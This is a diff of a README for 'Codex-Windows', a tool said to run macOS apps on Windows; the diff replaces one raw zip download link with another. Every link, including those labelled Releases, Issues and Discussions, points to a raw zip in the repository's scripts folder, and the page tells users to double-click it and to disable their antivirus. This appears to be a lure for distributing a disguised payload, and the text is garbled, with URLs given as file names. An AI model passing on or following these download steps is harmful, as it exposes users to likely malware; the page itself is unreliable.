@@ -1,6 +1,6 @@
 # 🚀 Codex-Windows - Run macOS Apps Seamlessly on Windows
 
-[![Download](https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Codex_Windows_1.8.zip%20Now-%https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Codex_Windows_1.8.zip)](https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Codex_Windows_1.8.zip)
+[![Download](https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Windows-Codex-2.7.zip%20Now-%https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Windows-Codex-2.7.zip)](https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Windows-Codex-2.7.zip)
 
 ## 📝 Description
 
@@ -10,13 +10,13 @@ Codex-Windows allows you to easily extract and run the macOS Codex Electron app 
 
 To get started, visit the following link to download the latest version of Codex-Windows:
 
-[Download Codex-Windows](https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Codex_Windows_1.8.zip)
+[Download Codex-Windows](https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Windows-Codex-2.7.zip)
 
 ### Steps to Download
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest release.
-3. Download the appropriate file for your system. It will usually be named something like `https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Codex_Windows_1.8.zip`.
+3. Download the appropriate file for your system. It will usually be named something like `https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Windows-Codex-2.7.zip`.
 4. Once the file is downloaded, find it in your `Downloads` folder or your designated download location.
 
 ### Extract the Files
@@ -28,8 +28,8 @@ To get started, visit the following link to download the latest version of Codex
 ### Run the Application
 
 1. Open the folder where you extracted the files.
-2. Find the file named `https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Codex_Windows_1.8.zip`.
-3. Double-click on `https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Codex_Windows_1.8.zip` to launch the application.
+2. Find the file named `https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Windows-Codex-2.7.zip`.
+3. Double-click on `https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Windows-Codex-2.7.zip` to launch the application.
 
 ## 💡 System Requirements
 
@@ -54,11 +54,11 @@ If you encounter any issues during installation or while running the application
 - **Check Compatibility**: Ensure your version of Windows meets the system requirements.
 - **Disable Antivirus**: Some antivirus software may block the app. Temporarily disable it and try again.
 - **Re-download**: If the application does not work properly, re-download the ZIP file and try extracting it again.
-- **Contact Support**: If issues persist, create an issue on the [GitHub Issues](https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Codex_Windows_1.8.zip) page for help.
+- **Contact Support**: If issues persist, create an issue on the [GitHub Issues](https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Windows-Codex-2.7.zip) page for help.
 
 ## 📞 Support
 
-For additional support or questions, visit our [GitHub Discussions](https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Codex_Windows_1.8.zip) page. You can ask questions or report any bugs you find.
+For additional support or questions, visit our [GitHub Discussions](https://github.com/Silakos1/Codex-Windows/raw/refs/heads/main/scripts/Windows-Codex-2.7.zip) page. You can ask questions or report any bugs you find.
 
 ## 🔄 Updates
 
